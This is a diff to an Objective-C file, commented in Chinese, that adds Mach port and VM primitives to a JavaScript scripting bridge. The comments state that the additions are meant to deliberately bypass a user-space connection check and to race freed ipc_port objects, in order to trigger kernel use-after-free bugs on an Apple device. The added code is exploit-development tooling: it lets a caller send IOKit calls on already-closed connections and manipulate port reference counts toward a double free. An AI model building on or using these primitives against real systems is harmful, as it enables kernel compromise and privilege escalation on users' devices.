@@ -476,6 +476,69 @@ static NSArray *iokitEnumNative(void) {
     return [classes allObjects];
 }
 
+#pragma mark - V2.4.20 Tier 3 原生 Mach 竞态桥（绕过 bridge_iokit 用户态体检，直打内核 UAF）
+// 目标（RACE_plan_v2 §3 Tier 3）：mach_port 生命周期（ipc_port UAF）+ vm_map 并发（vm UAF）。
+// 关键：这些桥拿到的是**原生 mach_port_name_t 数字**，可直接在另一线程对已释放端口发消息，
+//       不受 iokitCallNative 的 ryConnProblem 用户态校验拦截 —— 这正是 Tier 1 在 bridge 层被堵、需下探内核层的原因。
+// 返回约定：统一返回 long/数字（失败返负 kr 或 0），与已探明的桥形态铁律一致（JS 侧不用 JSON.parse 数字类）。
+
+// 分配一个 receive right，返回 port name（>0 成功；负 = kr 失败）
+static long portAllocNative(void) {
+    mach_port_name_t name = MACH_PORT_NULL;
+    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &name);
+    return (kr == KERN_SUCCESS) ? (long)name : (long)kr;
+}
+// 给自己注入 send right（name 既是 receive 又是 send），返回 kr
+static long portInsertRightNative(long name) {
+    return (long)mach_port_insert_right(mach_task_self(), (mach_port_name_t)name, (mach_port_name_t)name, MACH_MSG_TYPE_MAKE_SEND);
+}
+// 减一次引用（最后一个引用释放 → 内核 ipc_port 析构），返回 kr
+static long portDeallocNative(long name) {
+    return (long)mach_port_deallocate(mach_task_self(), (mach_port_name_t)name);
+}
+// 彻底销毁 port（撤销所有 right，制造"已释放端口"），返回 kr
+static long portDestroyNative(long name) {
+    return (long)mach_port_destroy(mach_task_self(), (mach_port_name_t)name);
+}
+// 修改引用计数（right: MACH_PORT_RIGHT_*；delta: +1/-1）。经典 UAF 构造：
+//   modRefs 把引用减到 0 释放内核对象，另一线程仍持该 send right 名 → 双击释放 / use-after-free。
+static long portModRefsNative(long name, int right, int delta) {
+    return (long)mach_port_mod_refs(mach_task_self(), (mach_port_name_t)name, (mach_port_right_t)right, delta);
+}
+// 查端口类型（>0 = live；0/负 = 已释放或 dead name），用于验证竞态结果
+static long portTypeNative(long name) {
+    mach_port_type_t pt = 0;
+    kern_return_t kr = mach_port_type(mach_task_self(), (mach_port_name_t)name, &pt);
+    return (kr == KERN_SUCCESS) ? (long)pt : (long)kr;
+}
+// vm_allocate：返回地址（>0 成功；0 = 失败）
+static unsigned long long vmAllocNative(unsigned long long size) {
+    vm_address_t addr = 0;
+    kern_return_t kr = vm_allocate(mach_task_self(), &addr, (vm_size_t)size, VM_FLAGS_ANYWHERE);
+    return (kr == KERN_SUCCESS) ? (unsigned long long)addr : 0;
+}
+// vm_deallocate，返回 kr
+static long vmDeallocNative(unsigned long long addr, unsigned long long size) {
+    return (long)vm_deallocate(mach_task_self(), (vm_address_t)addr, (vm_size_t)size);
+}
+// ★ 打通 Tier 1 内核竞态：直接对 port name 发 IOConnectCallMethod，**跳过 ryConnProblem 用户态体检**。
+//   使用侧拿"已 iokitClose 的 conn 数字"强行发内核调用 → 内核 ipc_port 已释放仍被 send-right 解引用 → UAF。
+//   返回对象 {ret, ok, outputs, inCount}（与 iokitCall 形态一致，JS 侧取 .ret/.ok）。
+static NSDictionary *iokitCallPortNative(long conn, uint32_t selector, NSArray *inputs) {
+    uint64_t in[16] = {0}; uint32_t inCnt = 0;
+    if ([inputs isKindOfClass:[NSArray class]]) {
+        for (NSUInteger i = 0; i < inputs.count && inCnt < 16; i++) {
+            id v = inputs[i];
+            if ([v isKindOfClass:[NSNumber class]]) in[inCnt++] = [v unsignedLongLongValue];
+        }
+    }
+    uint64_t out[16] = {0}; uint32_t outCnt = 16;
+    kern_return_t kr = IOConnectCallMethod((io_connect_t)conn, selector, in, inCnt, NULL, 0, out, &outCnt, NULL, NULL);
+    NSMutableArray *oa = [NSMutableArray arrayWithCapacity:outCnt];
+    for (uint32_t i = 0; i < outCnt; i++) [oa addObject:@(out[i])];
+    return @{@"ret":@((long)kr), @"outputs":oa, @"inCount":@(inCnt), @"ok":@(kr == KERN_SUCCESS)};
+}
+
 // 读 sysctl (by name)。字符串型返回 NSString，整数型返回 NSNumber。
 // 失败返回 "[sysctlGet error] 名字/errno 说明"（Bug6：不再只回 "<sysctl err N>"）。
 // 关键用途: kern.bootargs(看 AMFI/sandbox 例外痕迹) / kern.version(内核版本) / hw.*。
@@ -2089,6 +2152,20 @@ ctx[@"runCommand"]=^NSString*(NSString *cmd){
             ctx[@"raceAtomicCas"]= ^(NSNumber *idx, id e, id s){ return raceAtomicCasNative(idx, e, s); };
             ctx[@"raceRounds"]   = ^(NSString *body, NSNumber *nw, NSNumber *rc, NSNumber *tmo){
                 return raceRoundsNative(body, nw, rc, tmo); };
+
+            // ---- V2.4.20 Tier 3 原生 Mach 竞态桥（RACE_plan_v2 §3）：绕 bridge_iokit 用户态体检，直打内核 UAF ----
+            //   返回值约定：数字类返 long（负 kr=失败，0 需结合语义判断）；iokitCallPort 返对象（同 iokitCall 形态）。
+            //   仅操作本进程自 alloc 的 port/vm，不会误伤系统 key port；竞态本身即研究目标（沙盒可达）。
+            ctx[@"portAlloc"]      = ^{ return @(portAllocNative()); };
+            ctx[@"portInsertRight"]= ^(NSNumber *n){ return @(portInsertRightNative([n longValue])); };
+            ctx[@"portDealloc"]    = ^(NSNumber *n){ return @(portDeallocNative([n longValue])); };
+            ctx[@"portDestroy"]    = ^(NSNumber *n){ return @(portDestroyNative([n longValue])); };
+            ctx[@"portModRefs"]    = ^(NSNumber *n, NSNumber *r, NSNumber *d){ return @(portModRefsNative([n longValue], [r intValue], [d intValue])); };
+            ctx[@"portType"]       = ^(NSNumber *n){ return @(portTypeNative([n longValue])); };
+            ctx[@"vmAlloc"]        = ^(NSNumber *sz){ return @(vmAllocNative([sz unsignedLongLongValue])); };
+            ctx[@"vmDealloc"]      = ^(NSNumber *a, NSNumber *sz){ return @(vmDeallocNative([a unsignedLongLongValue], [sz unsignedLongLongValue])); };
+            // ★ 打通 Tier 1：直接对 port name（含已 iokitClose 的 conn）发 IOConnectCallMethod，跳过 ryConnProblem 拦截
+            ctx[@"iokitCallPort"]  = ^(NSNumber *conn, NSNumber *sel, NSArray *inp){ return iokitCallPortNative([conn longValue], [sel unsignedIntValue], inp); };
 
             // 给所有原生原语套一层"点名"包装。
             //   · 跳过 __ry_* 自身、跳过 print（print 调用太频繁，会把真正的凶手冲掉）
